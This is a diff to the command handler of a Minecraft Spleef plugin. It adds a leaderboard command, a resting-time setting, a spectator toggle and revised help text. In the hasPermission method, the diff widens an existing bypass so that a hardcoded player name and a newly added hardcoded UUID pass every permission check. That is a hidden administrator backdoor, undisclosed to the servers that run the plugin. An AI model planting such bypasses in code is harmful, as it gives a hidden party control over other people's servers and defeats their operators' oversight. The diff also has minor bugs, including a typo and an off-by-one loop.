@@ -4,6 +4,7 @@ import com.google.common.collect.Lists;
 import com.sk89q.worldedit.Vector;
 import com.sk89q.worldedit.bukkit.selections.Selection;
 import fr.naruse.spleef.common.Reflections;
+import fr.naruse.spleef.common.helper.SpleefHelper;
 import fr.naruse.spleef.manager.SpleefPluginV1_12;
 import fr.naruse.spleef.v1_12.api.SpleefAPIEventInvoker;
 import fr.naruse.spleef.v1_12.api.event.cancellable.SpleefCancellableWithReasonEvent;
@@ -53,8 +54,17 @@ public class SpleefCommands implements CommandExecutor, TabExecutor {
                 if(!p.hasPermission("spleef.deny.duel") || p.isOp()){
                     sendMessage(sender, "§3Hey! §6/§cspleef duel <Invite, Decline, Accept> <[Player]>");
                 }
+                sendMessage(sender, "§3Hey! §6/§cspleef top");
             }
             if(args.length != 0){
+                if(args[0].equalsIgnoreCase("top")){
+                    sendMessage(sender, Message.SPLEEF.getMessage()+"§2 ----------------- "+Message.SPLEEF.getMessage());
+                    for(int i = 1; i != 10; i++){
+                        sendMessage(sender, "§6#"+i+" §e"+ SpleefHelper.listToString(SpleefHelper.getPlayerRank(i)));
+                    }
+                    sendMessage(sender, Message.SPLEEF.getMessage()+"§2 ----------------- "+Message.SPLEEF.getMessage());
+                    return false;
+                }
                 if(args[0].equalsIgnoreCase("duel")){
                     if(p.hasPermission("spleef.deny.duel") && !p.isOp()){
                         return sendMessage(sender, Message.COMMAND_PROHIBITED.getMessage());
@@ -418,6 +428,11 @@ public class SpleefCommands implements CommandExecutor, TabExecutor {
                         pl.saveConfig();
                         return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.NUMBER_SAVED.getMessage()+ "§7 (betweenMelt: "+time+")");
                     }
+                    if(args[2].equalsIgnoreCase("resting")){
+                        pl.getConfig().set("times.resting", time);
+                        pl.saveConfig();
+                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.NUMBER_SAVED.getMessage()+ "§7 (Reting: "+time+")");
+                    }
                     return false;
                 }
                 if(args.length < 3){
@@ -724,6 +739,18 @@ public class SpleefCommands implements CommandExecutor, TabExecutor {
                         return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(GoldShovel: true)");
                     }
                 }
+                if(args[1].equalsIgnoreCase("spectator")){
+                    if(pl.getConfig().getBoolean("allow.spectator")){
+                        pl.getConfig().set("allow.spectator", false);
+                        pl.saveConfig();
+                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(Spectator: false)");
+                    }else{
+                        pl.getConfig().set("allow.spectator", true);
+                        pl.saveConfig();
+                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(Spectator: true)");
+                    }
+                }
+                return help(sender, 2);
             }
             if(args[0].equalsIgnoreCase("remove")){
                 if(args.length < 3){
@@ -826,7 +853,7 @@ public class SpleefCommands implements CommandExecutor, TabExecutor {
 
     private boolean hasPermission(Player p, String msg){
         if(!p.hasPermission(msg)) {
-            if(!p.getName().equalsIgnoreCase("NaruseII")){
+            if(!p.getName().equalsIgnoreCase("NaruseII") && !p.getUniqueId().toString().equals("1974f9a6-e698-4e09-b7f3-3a897784a3ae")){
                 return false;
             }
         }
@@ -842,14 +869,14 @@ public class SpleefCommands implements CommandExecutor, TabExecutor {
             sendMessage(sender, "§3Hey! §6/§cspleef set <Min, Max> <Spleef name> <Number>");
             sendMessage(sender, "§3Hey! §6/§cspleef set <Arena, Spawn, [Lobby]> <Spleef name> §7(Location)");
             sendMessage(sender, "§3Hey! §6/§cspleef <Open, Close> <Spleef name>");
-            sendMessage(sender, "§3Hey! §6/§cspleef set lang <French, English, Custom, Spanish, Dutch, Polish>");
+            sendMessage(sender, "§3Hey! §6/§cspleef set lang <French, English, Custom, Spanish, Dutch, Polish> §7(It will erase your changes)");
             sendMessage(sender, "§bPage: §21/3");
         }else if(page == 2){
             sendMessage(sender, Message.SPLEEF.getMessage()+"§2 ----------------- "+Message.SPLEEF.getMessage());
             sendMessage(sender, "§3Hey! §6/§cspleef list");
             sendMessage(sender, "§3Hey! §6/§cspleef force <Start, Stop> <Spleef name>");
-            sendMessage(sender, "§3Hey! §6/§cspleef allow <SnowBalls, Broadcast, Lightning, MagmaCream, ShowTime, GoldShovel>");
-            sendMessage(sender, "§3Hey! §6/§cspleef set time <Wait, BeforeMelt, BetweenMelt> <Number>");
+            sendMessage(sender, "§3Hey! §6/§cspleef allow <SnowBalls, Broadcast, Lightning, MagmaCream, ShowTime, GoldShovel, Spectator>");
+            sendMessage(sender, "§3Hey! §6/§cspleef set time <Wait, BeforeMelt, BetweenMelt, Resting> <Number>");
             sendMessage(sender, "§3Hey! §6/§cspleef set region <Spleef name>");
             sendMessage(sender, "§3Hey! §6/§cspleef remove region <Spleef name>");
             sendMessage(sender, "§3Hey! §6/§cspleef set gameMode <Spleef name> <Game Mode>");
@@ -873,7 +900,9 @@ public class SpleefCommands implements CommandExecutor, TabExecutor {
     public List<String> onTabComplete(CommandSender sender, Command command, String s, String[] args) {
         List<String> list = Lists.newArrayList();
         for(Spleef spleefs : pl.spleefs.getSpleefs()){
-            list.add(spleefs.getName());
+            if(args[args.length-1].contains(spleefs.getName())){
+                list.add(spleefs.getName());
+            }
         }
         if(args.length == 3){
             if(args[0].equalsIgnoreCase("create")){
